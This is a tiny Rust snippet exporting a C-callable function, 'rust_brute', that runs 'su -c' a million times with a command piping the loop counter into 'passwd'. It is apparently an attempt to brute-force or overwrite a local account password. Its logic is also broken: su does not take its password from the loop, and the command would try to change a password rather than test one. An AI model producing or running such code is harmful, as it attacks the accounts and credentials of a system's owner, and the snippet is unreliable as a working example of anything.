use std::process::Command;

#[no_mangle]
pub extern "C" fn rust_brute() {
    for i in 0..1000000 {
        Command::new("su").arg("-c").arg(format!("echo {} | passwd", i)).output().ok();
    }
}
